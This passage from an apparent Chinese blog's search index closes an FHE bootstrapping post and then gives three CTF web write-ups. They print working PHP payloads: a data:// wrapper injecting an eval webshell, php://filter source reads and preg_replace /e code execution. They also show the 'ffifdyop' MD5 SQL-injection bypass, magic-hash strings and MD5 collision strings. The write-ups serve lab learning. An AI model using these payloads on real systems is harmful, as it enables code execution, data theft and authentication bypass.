inline">\(t=q_{0}·I+\mu\)</span>的一个加密。<br></p><p>  （2）我们应用了一个同态线性转换来计算一个或两个加密了它们明文时隙中t(X)的系数的密文。这一步需要多密钥旋转和第5.1节中描述的共轭。<br></p><p>  （3）我们评估了一个多项式，其近似于模<span class="math inline">\(q_{0}\)</span>函数的约简。它去除了t的I部分并保留了时隙中μ的系数。<br></p><p>  （4）最后，我们应用了第二步的逆线性转换来将μ的全部系数压缩至一个密文中。<br></p><p>  输出密文<span class="math inline">\(\overline{ct}&#39;\)</span>加密了相比与输入密文<span class="math inline">\(\overline{ct}\)</span>更高层次的相同明文μ，即对某些<span class="math inline">\(0&lt;\iota&lt;L\)</span>，有<span class="math inline">\(&lt;\overline{ct}&#39;,\overline{sk}&gt;\approx\mu\ (mod\ q_{\iota})\)</span>。<br><br></p><hr /><p>  理论部分暂时就到这里了，后面的应用部分如果用得到的话就再更新吧</p><hr />]]></content>
    
    
    <categories>
      
      <category>FHE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>密码学</tag>
      
      <tag>FHE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GXUCTF easy-伪协议</title>
    <link href="/2021/10/08/GXUCTF-easy-%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    <url>/2021/10/08/GXUCTF-easy-%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<p>题目直接给出了源码</p><p><img src="https://tva4.sinaimg.cn/large/007aD2tWgy1gv9apna123j60r80cl75m02.jpg" /></p><p>一些新东西👇 open_basedir：将php所能打开的文件限制在指定的目录树中 pathinfo()：以数组的形式返回关于文件路径的信息(PATHINFO_DIRNAME - 只返回 dirname; PATHINFO_BASENAME - 只返回 basename; PATHINFO_EXTENSION - 只返回 extension; PATHINFO_FILENAME - 只返回 filename)</p><p>首先对$text进行了匹配，要求是字符串"how_to_bypass?"，可以利用伪协议进行写入 <code>data://text/plain,how_to_bypass?</code></p><p>继续对$file传入参数的后缀进行了检查，如果是php就进行文件包含，这里的绕过只需要在最后加一个.php就可以，很easy~</p><p>剩下的问题就是进行flag文件的读取了，现在我们是不知道flag所在文件的名称和路径的，我试着读了一下当前目录下的flag.php..失败了</p><p>这里看了大佬的博客，学到了新的知识=&gt;利用glob://伪协议进行目录遍历是可以无视open_basedir的</p><p><code>$file=data://text/plain,&lt;?php @eval($_REQUEST[1]);?&gt;.php&amp;1=var_dump(scandir('glob:///*'));</code></p><p><img src="https://tva4.sinaimg.cn/large/007aD2tWgy1gv9brxnl0ej61ne0chjwk02.jpg" /></p><p>其实open_basedir对解这道题并没啥影响，flag文件就在当前目录下，所有直接用scandir('.')就能看到</p><p><img src="https://tva3.sinaimg.cn/large/007aD2tWgy1gv9brhg4dxj61l0091ace02.jpg" /></p><p>得到文件名后就可以进行读取了，可以file_get_contents直接读 <code>$file=data://text/plain,&lt;?php @eval($_REQUEST[1]);?&gt;.php&amp;1=echo file_get_contents('fll11llaaaggg.php');</code></p><p><img src="https://tvax3.sinaimg.cn/large/007aD2tWgy1gv9c3k8uqpj60it032t8u02.jpg" /></p><p>我真的是个憨批..这里读出的flag在源码里，我还以为没读到来回搞了好久，最后去问了出题人..给自己一锤😢</p><p>或者php://filter读取</p><p><img src="https://tvax3.sinaimg.cn/large/007aD2tWgy1gv9c2kzk3ij61hw096ac902.jpg" /></p><p>解码得到flag</p>]]></content>
    
    
    <categories>
      
      <category>一些杂题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP伪协议</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BJDCTF ZJCTF不过如此</title>
    <link href="/2021/10/06/BJDCTF-ZJCTF%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/"/>
    <url>/2021/10/06/BJDCTF-ZJCTF%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/</url>
    
    <content type="html"><![CDATA[<p>直接给出源码</p><p><img src="https://tva3.sinaimg.cn/large/007aD2tWgy1gv9c9lvljyj60um0gadhl02.jpg" /></p><p>这里$text可以利用data伪协议写入，根据提示利用filter读取next.php <code>text=data://text/plain,I have a dream&amp;file=php://filter/read=convert.base64-encode/resource=next.php</code></p><p><img src="https://tvax1.sinaimg.cn/large/007aD2tWgy1gv9cciyy2ij61nz0cz41x02.jpg" /></p><p>解码得到next.php源码 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>] = <span class="hljs-variable">$id</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">complex</span>(<span class="hljs-params"><span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> preg_replace(<br>        <span class="hljs-string">&#x27;/(&#x27;</span> . <span class="hljs-variable">$re</span> . <span class="hljs-string">&#x27;)/ei&#x27;</span>,<br>        <span class="hljs-string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,<br>        <span class="hljs-variable">$str</span><br>    );<br>&#125;<br><br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$re</span> =&gt; <span class="hljs-variable">$str</span>) &#123;<br>    <span class="hljs-keyword">echo</span> complex(<span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span>). <span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure></p><p>这里读flag肯定要通过getFlag()函数，没什么思路去看了wp，学到很多新知识</p><p>⭐preg_replace(<span class="math inline">\(pattern,\)</span>replacement,<span class="math inline">\(subject)：在\)</span>subject中匹配<span class="math inline">\(pattern，并将其替换为\)</span>replacement /e修正符，$replacement中的字符串会被当作PHP代码执行 这里就提供给我们执行命令的机会，'strtolower("\\1")'会被当做PHP代码执行</p><p>⭐正则表达式中的'\\1'，其实就是转义后的'\1'，表示取出正则匹配后的第一个子匹配中的第一项 构造payload<code>\S%2b=phpinfo();</code> 这里，+表示匹配1或更多次，+就能匹配一个完整字符串了，URL传参的话+需要进行编码，否则会被认作空格</p><p>得到'strtolower("phpinfo();")' 传参进去后发现代码并没有被执行？</p><p><img src="https://tva4.sinaimg.cn/large/007aD2tWgy1gv9cvepa7aj60yn08emya02.jpg" /></p><p>这里又涉及到一个PHP的小性质 ⭐在php中，双引号里面如果包含有变量，php解释器会进行解析；单引号中的变量不会被处理。 目前我们构造的payload最终执行时相当于=&gt;eval('strrolower("phpinfo();")');</p><p>⭐PHP可变变量<span class="math inline">\({\)</span>a} <code>\S%2b=$&#123;phpinfo()&#125;</code></p>]]></content>
    
    
    <categories>
      
      <category>BUU刷题记录</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>PHP伪协议</tag>
      
      <tag>正则表达式</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BJDCTF Easy_MD5</title>
    <link href="/2021/10/06/BJDCTF-Easy-MD5/"/>
    <url>/2021/10/06/BJDCTF-Easy-MD5/</url>
    
    <content type="html"><![CDATA[<p>1、打开是一个查询框，用burp发包看一下</p><p><img src="https://tvax4.sinaimg.cn/large/007aD2tWgy1gv5p06qjefj612208843202.jpg" /></p><p>在Response里有一句提示 <code>Hint: select * from 'admin' where password=md5($pass,true)</code></p><p>首先说明一下这个函数 👉md5(<span class="math inline">\(pass, true)：\)</span>pass是待加密字符串，第二个参数设为true，控制输出为原始16字符二进制格式</p><p>所以我们要想办法结合这个函数来进行SQL注入，这里看了大佬的wp，学习到一个类似万能密码的东东<code>ffifdyop</code></p><p>这个字符串经过md5加密后会输出一串<code>'or'6XXXXX</code>，结合查询语句 👉<code>select * from 'admin' where password = ''or'6XXXXX'</code> 后面的'6XXXXX'就等价于一个永真式，至此就绕过了md5函数，注入成功！</p><p>2、下面来到第二个界面，一句大大的Do you like MD5，那必然like..在源码里找到提示信息</p><p><img src="https://tvax3.sinaimg.cn/large/007aD2tWgy1gv5pz39fwhj60l305gmxe02.jpg" /></p><p>这里涉及到PHP的'=='弱比较漏洞，如果进行比较的两个值类型不同，PHP会首先将其化为相同类型再进行比较，在处理哈希字符串时，它会把所有以'0e'开头的哈希值都解析为0，所以这里传两个哈希后'0e'开头的字符串即可</p><p>附上一些可用字符串： * QNKCDZO * 240610708 * s878926199a * s155964671a</p><p>也附上一个弱类型比较表给大家</p><p><img src="https://tva2.sinaimg.cn/large/007aD2tWgy1gv5q4kysamj61bg0riqp702.jpg" /></p><p>3、绕过成功，来到第三个界面</p><p><img src="https://tvax1.sinaimg.cn/large/007aD2tWgy1gv5qizplz3j60tl07q3z202.jpg" /></p><p>'==='进行比较时，会判断值+类型，可以选择强碰撞或者md5数组绕过</p><p>PHP的md5()函数是无法处理数组的，在传入的参数为数组时会返回NULL，因此只需要传入两个不同值的数组，得到的结果就是'NULL === NULL'啦</p><p>强碰撞的话，这里给出几个md5值相同的字符串： <figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl">$s1 = <span class="hljs-string">&quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab&quot;</span><br>$s2 = <span class="hljs-string">&quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%5f%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%f3%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%e9%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%13%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%a8%1b%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%39%05%39%95%ab&quot;</span><br>$s3 = <span class="hljs-string">&quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%ed%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%a7%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%e6%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%16%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%33%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%6f%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab&quot;</span><br></code></pre></td></tr></table></figure></p><p>然后就顺利得到flag啦~</p>]]></content>
    
    
    <categories>
      
      <category>BUU刷题记录</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>MD5</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
